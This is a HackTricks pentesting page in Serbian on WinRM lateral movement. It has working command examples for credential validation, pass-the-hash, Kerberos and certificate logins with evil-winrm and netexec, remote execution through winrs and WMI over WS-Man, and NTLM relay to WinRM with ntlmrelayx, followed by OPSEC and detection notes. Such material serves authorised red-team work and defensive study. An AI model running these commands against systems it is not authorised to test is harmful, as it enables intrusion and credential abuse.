# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM je jedan od najpraktičnijih transporta za **lateral movement** u Windows okruženjima jer ti daje remote shell preko **WS-Man/HTTP(S)** bez potrebe za SMB trikovima za kreiranje servisa. Ako target izlaže **5985/5986** i tvoj principal sme da koristi remoting, često možeš vrlo brzo da pređeš sa "valid creds" na "interactive shell".

Za **enumeraciju protokola/servisa**, listeners, enabling WinRM, `Invoke-Command`, i generic client usage, pogledaj:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Koristi **HTTP/HTTPS** umesto SMB/RPC, pa često radi tamo gde je PsExec-style execution blokiran.
- Sa **Kerberos**, ne šalje reusable credentials na target.
- Radi uredno sa **Windows**, **Linux**, i **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interaktivni PowerShell remoting path pokreće **`wsmprovhost.exe`** na targetu pod kontekstom autentifikovanog korisnika, što je operativno drugačije od service-based exec.

## Access model and prerequisites

U praksi, uspešan WinRM lateral movement zavisi od **tri** stvari:

1. Target ima **WinRM listener** (`5985`/`5986`) i firewall pravila koja dozvoljavaju pristup.
2. Account može da se **authenticate** na endpoint.
3. Account sme da **open a remoting session**.

Uobičajeni načini da dobiješ taj pristup:

- **Local Administrator** na targetu.
- Membership u **Remote Management Users** na novijim sistemima ili **WinRMRemoteWMIUsers__** na sistemima/komponentama koje i dalje poštuju tu grupu.
- Explicit remoting rights delegirani kroz local security descriptors / PowerShell remoting ACL changes.

Ako već kontrolišeš box sa admin pravima, zapamti da možeš i da **delegate WinRM access without full admin group membership** koristeći tehnike opisane ovde:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos requires a hostname/FQDN**. Ako se povežeš preko IP adrese, client obično pada nazad na **NTLM/Negotiate**.
- U **workgroup** ili cross-trust edge cases, NTLM obično zahteva ili **HTTPS** ili da target bude dodat u **TrustedHosts** na clientu.
- Sa **local accounts** preko Negotiate u workgroup okruženju, UAC remote restrictions mogu da spreče pristup osim ako se ne koristi built-in Administrator account ili `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting podrazumevano koristi **`HTTP/<host>` SPN**. U okruženjima gde je **`HTTP/<host>`** već registrovan na neki drugi service account, WinRM Kerberos može da padne sa `0x80090322`; koristi port-qualified SPN ili pređi na **`WSMAN/<host>`** gde taj SPN postoji.

Ako dobiješ valid credentials tokom password spraying-a, validacija preko WinRM je često najbrži način da proveriš da li se pretvaraju u shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec za validaciju i one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM za interaktivne shell-ove

`evil-winrm` i dalje ostaje najpogodnija interaktivna opcija sa Linux-a jer podržava **lozinke**, **NT hash-eve**, **Kerberos tikete**, **client certificates**, prenos fajlova i in-memory učitavanje PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Kada podrazumevani **`HTTP/<host>`** SPN uzrokuje Kerberos greške, pokušajte da zatražite/koristite **`WSMAN/<host>`** ticket umesto toga. Ovo se pojavljuje u ojačanim ili neobičnim enterprise postavkama gde je `HTTP/<host>` već dodeljen drugom service account-u.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Ovo je takođe korisno nakon zloupotrebe **RBCD / S4U** kada ste posebno forged ili requested **WSMAN** service ticket umesto generičkog `HTTP` ticket-a.

### Certificate-based authentication

WinRM takođe podržava **client certificate authentication**, ali certificate mora biti mapiran na target-u na **local account**. Iz ofanzivne perspektive, ovo je važno kada:

- ste već ukrali/izvezli validan client certificate i private key koji su već mapirani za WinRM;
- ste zloupotrebili **AD CS / Pass-the-Certificate** da biste dobili certificate za principal-a, a zatim pivot-ovali u drugi authentication path;
- radite u environment-u koji namerno izbegava password-based remoting.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM je mnogo ređi od password/hash/Kerberos auth, ali kada postoji može da obezbedi **passwordless lateral movement** putanju koja preživljava rotaciju lozinki.

### Python / automation sa `pypsrp`

Ako vam je potrebna automatizacija umesto operator shell-a, `pypsrp` vam daje WinRM/PSRP iz Pythona sa podrškom za **NTLM**, **certificate auth**, **Kerberos** i **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` je ugrađen i koristan kada želite **native WinRM command execution** bez otvaranja interaktivne PowerShell remoting sesije:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operativno, `winrs.exe` obično dovodi do udaljenog lanca procesa sličnog:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Ovo vredi zapamtiti jer se razlikuje od service-based exec i od interactive PSRP sessions.

### `winrm.cmd` / WS-Man COM umesto PowerShell remoting

Možete takođe izvršavati kroz **WinRM transport** bez `Enter-PSSession` tako što ćete pozivati WMI klase preko WS-Man. Ovo zadržava transport kao WinRM, dok primitiv za udaljeno izvršavanje postaje **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Ovaj pristup je koristan kada:

- PowerShell logging je jako nadgledan.
- Želite **WinRM transport** ali ne i klasičan PS remoting workflow.
- Gradite ili koristite custom tooling oko **`WSMan.Automation`** COM objekta.

## NTLM relay na WinRM (WS-Man)

Kada je SMB relay blokiran zbog signing-a, a LDAP relay je ograničen, **WS-Man/WinRM** i dalje može biti atraktivan relay target. Moderni `ntlmrelayx.py` uključuje **WinRM relay servere** i može da relaye-uje na **`wsman://`** ili **`winrms://`** targete.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dve praktične napomene:

- Relay je najkorisniji kada target prihvata **NTLM** i kada relayed principal ima dozvolu da koristi WinRM.
- Noviji Impacket code posebno obrađuje zahteve **`WSMANIDENTIFY: unauthenticated`** tako da probes tipa `Test-WSMan` ne pokvare relay flow.

Za multi-hop ograničenja nakon što se uspostavi prva WinRM sesija, pogledaj:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC i napomene o detekciji

- **Interactive PowerShell remoting** obično kreira **`wsmprovhost.exe`** na targetu.
- **`winrs.exe`** obično kreira **`winrshost.exe`** a zatim traženi child process.
- Očekuj **network logon** telemetriju, WinRM service evente i PowerShell operational/script-block logging ako koristiš PSRP umesto raw `cmd.exe`.
- Ako ti treba samo jedna komanda, `winrs.exe` ili jednokratno WinRM izvršavanje mogu biti tiši od dugovečne interactive remoting sesije.
- Ako je Kerberos dostupan, preferiraj **FQDN + Kerberos** umesto IP + NTLM da bi smanjio i trust probleme i nezgodne client-side `TrustedHosts` izmene.

## Reference

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
